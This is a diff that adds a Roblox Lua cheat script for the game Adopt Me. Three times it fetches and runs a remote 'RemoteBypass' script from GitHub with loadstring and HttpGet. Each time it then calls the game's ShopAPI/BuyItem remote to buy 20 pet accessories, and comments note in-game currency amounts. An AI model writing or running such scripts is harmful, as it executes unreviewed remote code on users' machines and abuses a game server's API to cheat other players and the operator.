@@ -1,1 +1,33 @@
-print("poor")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenijo/AdoptMe-RemoteBypass/main/Bypass.lua"))()
+wait(0.1)
+local args = {
+    "pet_accessories",
+   "eco_brown_branch_headphones", 
+    {
+        buy_count = 20
+    }
+}
+game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ShopAPI/BuyItem"):InvokeServer(unpack(args))
+--1,600 bucks 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenijo/AdoptMe-RemoteBypass/main/Bypass.lua"))()
+wait(0.1)
+local args = {
+    "pet_accessories",
+ "sun_and_moon_earrings", 
+    {
+        buy_count = 20
+    }
+}
+game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ShopAPI/BuyItem"):InvokeServer(unpack(args))
+--500 bucks
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenijo/AdoptMe-RemoteBypass/main/Bypass.lua"))()
+wait(0.1)
+local args = {
+    "pet_accessories",
+ "witch_boots", 
+    {
+        buy_count = 20
+    }
+}
+game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ShopAPI/BuyItem"):InvokeServer(unpack(args))
+--300 bucks
